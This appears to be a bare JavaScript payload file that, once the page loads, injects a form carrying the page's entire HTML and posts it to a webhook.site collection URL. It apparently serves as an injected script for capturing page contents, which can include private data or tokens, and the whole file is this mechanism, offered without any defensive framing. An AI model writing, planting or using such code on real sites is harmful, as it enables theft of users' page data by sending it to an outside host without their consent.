// index.js

// The webhook URL
const webhookUrl = "https://webhook.site/41b3fa6e-82f9-4bcc-af04-46260100132c";

// Function to create and submit a form with the page's HTML body as payload
function createAndAppendFormWithHtmlBody() {
    // Get the current HTML content of the page
    const pageContent = document.documentElement.outerHTML; // The complete HTML of the page

    // Create a form element
    const form = document.createElement("form");
    form.method = "POST";
    form.action = webhookUrl;

    // Add a hidden input field to store the HTML content
    const hiddenInput = document.createElement("input");
    hiddenInput.type = "hidden";
    hiddenInput.name = "htmlBody"; // Key for the payload
    hiddenInput.value = pageContent;

    // Add a submit button
    const submitButton = document.createElement("button");
    submitButton.type = "submit";
    submitButton.textContent = "Submit HTML Body";

    // Append the hidden input and submit button to the form
    form.appendChild(hiddenInput);
    form.appendChild(submitButton);

    // Add the form to the body
    document.body.appendChild(form);
    
    console.log("Form with HTML body has been added to the DOM.");
}

// Ensure the function runs after the DOM is fully loaded
document.addEventListener("DOMContentLoaded", () => {
    console.log("DOM fully loaded. Creating and appending form...");
    createAndAppendFormWithHtmlBody();
});
